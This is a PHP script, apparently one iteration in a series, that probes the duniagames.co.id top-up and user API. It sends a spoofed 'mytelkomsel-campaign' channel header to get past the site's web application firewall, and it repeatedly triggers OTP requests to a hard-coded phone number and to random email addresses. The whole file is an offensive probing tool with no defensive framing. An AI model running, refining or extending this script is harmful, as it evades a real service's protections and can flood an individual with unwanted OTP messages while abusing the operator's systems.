<?php
// Ronde 11: bangun alur top-up duniagames yang BENER (catalog -> inquiry -> req-otp),
// plus uji header 'channel: mytelkomsel-campaign' buat nembus WAF di send-otp.
$UA = 'Mozilla/5.0 (Linux; Android 10; K) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/153.0.0.0 Mobile Safari/537.36';
$L = '083822461998'; $N = '83822461998'; $P = '6283822461998';
$BASE = 'https://api.duniagames.co.id/api/';
$CH = ['channel: mytelkomsel-campaign', 'device-brand: samsung'];

function req($method, $url, $body, $extra = [], $UA = null) {
  $UA = $UA ?: 'Mozilla/5.0 (Linux; Android 10; K) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/153.0.0.0 Mobile Safari/537.36';
  $ch = curl_init();
  $h = array_merge(['Accept: application/json, text/plain, */*',
    'Content-Type: application/json', 'Origin: https://duniagames.co.id',
    'Referer: https://duniagames.co.id/'], $extra, ['User-Agent: ' . $UA]);
  curl_setopt_array($ch, [CURLOPT_URL => $url, CURLOPT_HTTPHEADER => $h, CURLOPT_RETURNTRANSFER => true,
    CURLOPT_CONNECTTIMEOUT => 10, CURLOPT_TIMEOUT => 30, CURLOPT_ENCODING => '', CURLOPT_CUSTOMREQUEST => $method]);
  if ($method !== 'GET' && $body !== '') curl_setopt($ch, CURLOPT_POSTFIELDS, $body);
  $r = (string) curl_exec($ch); $code = (int) curl_getinfo($ch, CURLINFO_HTTP_CODE);
  curl_close($ch);
  return [$code, $r];
}
function ringkas($code, $body) {
  $f = trim(preg_replace('/\s+/', ' ', $body));
  if (stripos($f, 'Just a moment') !== false || stripos($f, 'Attention Required') !== false) return '[' . $code . '] WAF';
  if (preg_match('/^\s*</', $f)) return '[' . $code . '] html';
  return '[' . $code . '] ' . ($f !== '' ? substr($f, 0, 190) : '(kosong)');
}

// 1) ambil 1 produk dari catalog
[$c, $b] = req('GET', $BASE . 'product/catalog/v1/product-catalog', '');
$cat = json_decode($b, true);
$prod = null; $item = null;
foreach (($cat['data'] ?? []) as $g) {
  $its = $g['item'] ?? $g['items'] ?? $g['product'] ?? [];
  if ($its) { $prod = $g; $item = is_array($its[0]) ? $its[0] : null; break; }
}
echo "catalog [$c] game=" . ($prod['slug'] ?? '?') . " jumlah_item=" . count($cat['data'] ?? []) . "\n";
echo "field game : " . implode(', ', array_keys($prod ?? [])) . "\n";
echo "field item : " . json_encode($item) . "\n\n";

// 2) uji header campaign di path yang tadinya ke-blok
foreach ([
  ['send-otp', 'user/api/v2/user/send-otp', '{"email":"coba' . random_int(1000, 9999) . '@gmail.com"}'],
  ['settle-v2', 'transaction/v2/settlement/v2/req-otp', '{"phoneNumber":"' . $L . '"}'],
  ['topup-req-otp', 'transaction/v1/top-up/transaction/req-otp/', '{"phoneNumber":"' . $L . '","inquiryId":"1"}'],
  ['inquiry-store', 'transaction/v1/top-up/inquiry/store', '{}'],
] as [$n, $p, $bd]) {
  [$c1, $b1] = req('POST', $BASE . $p, $bd, $CH);
  printf("%-14s +header-campaign %s\n", $n, ringkas($c1, $b1));
}
echo "\n";

// 3) inquiry/store: varian body
[$pcId, $itId] = [(int)($item['product_id'] ?? $prod['id'] ?? 0), (int)($item['id'] ?? 0)];
$variants = [
  '{"product_id":' . $pcId . ',"item_id":' . $itId . ',"customerNumber":"' . $N . '","gameId":"' . ($prod['product_ref'] ?? $prod['slug'] ?? '') . '","channelId":1}',
  '{"product_id":' . $pcId . ',"item_id":' . $itId . ',"customerNumber":"' . $N . '"}',
  '{"phoneNumber":"' . $L . '","itemId":' . $itId . ',"productId":' . $pcId . '}',
  '{}',
];
foreach ($variants as $i => $v) {
  [$c2, $b2] = req('POST', $BASE . 'transaction/v1/top-up/inquiry/store', $v);
  printf("inquiry-store v%d %-8s %s\n", $i, 'body' . $i, ringkas($c2, $b2));
}
echo "\n";

// 4) req-otp dengan inquiryId beneran kalau inquiry sukses
preg_match('/"inquiryId"\s*:\s*"?(\d+)/', $b2, $mm);
$iq = $mm[1] ?? '';
echo "inquiryId hasil tes: " . ($iq !== '' ? $iq : '(nggak ada)') . "\n";
if ($iq !== '') {
  foreach (['transaction/v2/settlement/v2/req-otp', 'transaction/v1/settlement/v1/req-otp',
            'transaction/v1/top-up/transaction/req-otp/'] as $p) {
    [$c3, $b3] = req('POST', $BASE . $p, json_encode(['phoneNumber' => $L, 'inquiryId' => $iq]));
    printf("req-otp %-42s %s\n", $p, ringkas($c3, $b3));
  }
}
echo "\n";
